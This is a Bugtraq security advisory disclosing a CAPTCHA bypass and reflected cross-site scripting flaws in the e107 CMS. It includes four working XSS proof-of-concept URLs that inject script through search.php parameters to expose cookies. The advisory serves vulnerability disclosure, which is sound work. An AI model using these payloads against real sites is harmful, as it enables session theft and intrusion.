Subject: Vulnerabilities in E107

Hello Bugtraq!

I want to warn you about Insufficient Anti-automation and Cross-Site
Scripting vulnerabilities in E107. I found XSS holes in October 2006 and
Insufficient Anti-automation in November 2007, and disclosed them at
30.01.2009.

Insufficient Anti-Automation:

Vulnerability is in captcha at send link to news page
(http://site/email.php?news.1). And this captcha is also used at
registration page and forget password page.

http://websecurity.com.ua/uploads/2009/E107%20CAPTCHA%20bypass.html

Captcha is vulnerable to half-automated bypass method
(http://websecurity.com.ua/1595/), which I described in my project Month of
Bugs in Captchas (http://websecurity.com.ua/category/mobic/).

XSS:

Vulnerabilities are in search.php in parameters in, ex, ep and be.

http://site/search.php?in=%27%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/search.php?ex=%27%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/search.php?ep=%27%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/search.php?be=%27%3Cscript%3Ealert(document.cookie)%3C/script%3E

For XSS are vulnerable old versions of E107 and for Insufficient
Anti-automation are vulnerable all versions of E107.

I mentioned about these vulnerabilities at my site
(http://websecurity.com.ua/2841/).
